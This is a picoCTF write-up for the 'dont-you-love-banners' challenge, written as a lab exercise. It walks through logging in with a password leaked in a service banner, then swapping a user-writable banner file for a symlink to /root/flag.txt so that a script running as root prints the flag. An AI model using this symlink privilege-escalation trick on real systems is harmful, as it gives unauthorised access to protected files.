# dont-you-love-banners #
 
## Overview ##

300 points

Category: [General Skills](../)

Tags: `#generalskills #linux`

## Description ##

Can you abuse the banner?

The server has been leaking some crucial information on tethys.picoctf.net 51552. Use the leaked information to get to the server.
To connect to the running application use nc tethys.picoctf.net 54049. From the above information abuse the machine and find the flag in the /root directory.

## Approach ##

The challenge description indicates some leaking of information from the provided port, suggesting we can use this to get to the server :

    $ nc tethys.picoctf.net 51552
    SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234

Connecting to the challenge server instance via the second port we are prompted for this password :

    $ nc tethys.picoctf.net 63315
    *************************************
    **************WELCOME****************
    *************************************

    what is the password? 
    My_Passw@rd_@1234

We are then prompted for the answers to two cyber security based questions, the answers can be found from googling if not already known :

    What is the top cyber security conference in the world?
    DEF CON
    the first hacker ever was known for phreaking(making free phone calls), who was it?
    John Draper
    player@challenge:~$

We are now presented with a shell and can begin to look around, remembering the challenge description indicates the flag file is in `/root` :

    player@challenge:~$ ls -al
    ls -al
    total 20
    drwxr-xr-x 1 player player   20 Mar  9  2024 .
    drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
    -rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
    -rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
    -rw-r--r-- 1 player player  807 Apr  4  2018 .profile
    -rw-r--r-- 1 player player  114 Feb  7  2024 banner
    -rw-r--r-- 1 root   root     13 Feb  7  2024 text
    
    player@challenge:~$ cat banner
    cat banner
    *************************************
    **************WELCOME****************
    *************************************
    
    player@challenge:~$ cat text
    cat text
    keep digging

    player@challenge:~$ ls -al /root
    ls -al /root
    total 16
    drwxr-xr-x 1 root root    6 Mar 12  2024 .
    drwxr-xr-x 1 root root   29 Nov  7 02:25 ..
    -rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
    -rw-r--r-- 1 root root  148 Aug 17  2015 .profile
    -rwx------ 1 root root   46 Mar 12  2024 flag.txt
    -rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
    
    player@challenge:~$ cat /root/flag.txt
    cat /root/flag.txt
    cat: /root/flag.txt: Permission denied
    
    player@challenge:~$ cat /root/script.py 
    cat /root/script.py
    
    import os
    import pty
    
    incorrect_ans_reply = "Lol, good try, try again and good luck\n"
    
    if __name__ == "__main__":
        try:
          with open("/home/player/banner", "r") as f:
            print(f.read())
        except:
          print("*********************************************")
          print("***************DEFAULT BANNER****************")
          print("*Please supply banner in /home/player/banner*")
          print("*********************************************")
    
    try:
        request = input("what is the password? \n").upper()
        while request:
            if request == 'MY_PASSW@RD_@1234':
                text = input("What is the top cyber security conference in the world?\n").upper()
                if text == 'DEFCON' or text == 'DEF CON':
                    output = input(
                        "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                    if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                        scmd = 'su - player'
                        pty.spawn(scmd.split(' '))
    
                    else:
                        print(incorrect_ans_reply)
                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
                break
    
    except:
        KeyboardInterrupt

We can see this `script.py` python script loads the login banner from `/home/player/banner` file. Which from our initial `ls` we have full read/write access to.

## Solution ##

We can't modify the `script.py` but we can make use of the fact it loads the banner from file in an area with can control, so lets switch out the banner for something else, like the flag file, using symbolic links.

    player@challenge:~$ mv banner banner_orig
    mv banner banner_orig
    player@challenge:~$ ln -s /root/flag.txt /home/player/banner
    ln -s /root/flag.txt /home/player/banner

We still don't have access to read the now linked `flag.txt` file by for example `cat banner`, however the `script.py` runs as root on login. So closing our connection to the server and reconnecting yields:

    $ nc tethys.picoctf.net 63315
    picoCTFpicoCTF{...........redacted.............}

    what is the password? 

Where the actual flag value has been redacted for the purposes of this write up.
